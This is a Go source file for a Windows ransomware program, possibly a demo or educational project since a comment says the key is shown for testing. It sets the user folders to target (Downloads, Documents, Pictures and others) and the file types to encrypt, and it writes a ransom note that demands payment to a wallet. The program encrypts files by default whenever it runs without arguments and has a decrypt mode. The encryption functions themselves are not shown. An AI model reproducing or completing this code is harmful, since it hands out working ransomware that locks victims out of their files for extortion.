package main

import (
	"fmt"
	"log"
	"os"
	"runtime"
)

var (
	InterestingDirs       = []string{"Downloads", "Pictures", "Music", "Documents", "Videos"}
	InterestingExtensions = []string{"docx", "png", "jpg", "pdf", "txt", "html"}
	MatchedFiles          = []string{}
	EncryptionExtension   = ".encrypted"
	BaseDir               = fmt.Sprintf("%s\\", os.Getenv("USERPROFILE"))
	EncMessage            = `
	YOUR FILES HAVE BEEN ENCRYPTED USING A STRONG 
	AES-256 ALGORITHM.

	YOUR IDENTIFICATION IS %s

	PLEASE SEND %s TO THE FOLLOWING WALLET 

			      %s

	TO RECOVER THE KEY NECESSARY TO DECRYPT YOUR
	FILES

	# The enc key is inserted for testing
	# ENCRYPTION KEY: %s

	AFTER RECOVER YOUR KEY, RUN THE FOLLOWING:
	%s decrypt yourkeyhere
	`
)

func main() {
	printBanner()

	checkOS()

	args := os.Args

	if len(args) < 2 {
		encryptFiles()

		// Wait for enter to exit
		var s string
		fmt.Scanf("%s", &s)
		return
	}

	switch args[1] {
	case "-h", "help", "h":
		usage("")
	case "decrypt":
		if len(args) != 3 {
			usage("Missing decryption key")
		}

		decryptFiles(os.Args[2])
	}

}

func checkOS() {
	if runtime.GOOS != "windows" {
		log.Fatalln("Sorry, but your OS is currently not supported. Try again with a windows machine")
	}
}
